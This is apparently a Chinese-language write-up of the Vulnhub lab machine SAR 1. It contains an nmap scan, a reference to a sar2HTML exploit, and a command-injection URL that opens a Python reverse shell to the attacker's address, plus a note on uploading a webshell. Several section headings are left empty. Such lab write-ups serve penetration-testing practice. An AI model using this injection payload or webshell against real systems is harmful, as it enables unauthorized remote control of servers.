---
layer: article
title: Vulnhub	425 SAR 1
tags: pentest vulnhub writeup
---

考点：文件上传、命令执行

靶机链接：<https://www.vulnhub.com/entry/sar-1,425/>

## 环境配置

## 初步打点

端口扫描
WEB测试
漏洞发现

## 获得权限

靶机测试

## 提权


425

```bash
$ sudo nmap -v -A -p- $tip
Scanning 10.0.2.12 [65535 ports]
Discovered open port 80/tcp on 10.0.2.12
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

看来要硬钢web应用了

搜一下sar2ascii.tar发现

https://www.exploit-db.com/exploits/47204 试了试



这里用python失败了，可以替换python3.7 python3.6 python3.8

```
http://10.0.2.12/sar2HTML/index.php?plot=;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

另外可以点击new直接上传webshell，对应目录是/sarDATA/uPLOAD/

```bash
http://10.0.2.12/sar2HTML//sarDATA/uPLOAD/2.php
```


